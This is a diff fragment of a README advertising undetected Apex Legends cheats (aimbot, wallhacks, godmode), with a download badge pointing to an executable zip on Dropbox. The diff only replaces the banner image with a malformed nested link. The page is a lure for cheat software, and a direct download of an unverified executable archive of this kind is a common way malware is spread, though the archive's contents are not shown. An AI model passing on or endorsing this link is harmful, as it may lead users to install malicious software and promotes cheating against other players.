@@ -2,7 +2,8 @@
 ## Apex Legends Hacks 🎯 Godmode, Speedhack, Aimbot, Wallhacks, And More... Undetected Cheats for Apex Legends That Will make you BETTER!
 ---
 [![Download](https://img.shields.io/badge/Apex%20Cheat%20COSMO-red?style=for-the-badge&logo=apexlegends&logoColor=white)](https://www.dropbox.com/scl/fi/8xtx85wwlbpnhikhxl9wk/LaunchExecCoreV2.41.11_x64.zip?rlkey=f88ljuexe92l3zc3yvcj44eed&st=s178y9s0&dl=1)
-![Apex Cheat Banner](https://i.ytimg.com/vi/5ssCEr8dc5s/hq720.jpg?sqp=-oaymwEhCK4FEIIDSFryq4qpAxMIARUAAAAAGAElAADIQj0AgKJD&rs=AOn4CLAlJcINXRM7YzPlbUgMzh60mCTMDA)
+
+![Apex Cheat Banner]([https://i.ytimg.com/vi/5ssCEr8dc5s/hq720.jpg?sqp=-oaymwEhCK4FEIIDSFryq4qpAxMIARUAAAAAGAElAADIQj0AgKJD&rs=AOn4CLAlJcINXRM7YzPlbUgMzh60mCTMDA](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS0h-GVwstF_JV-drlk7uX17VbzMZFPPVRHnA&s))
 
 
 | Option                                    | Description                                                       |
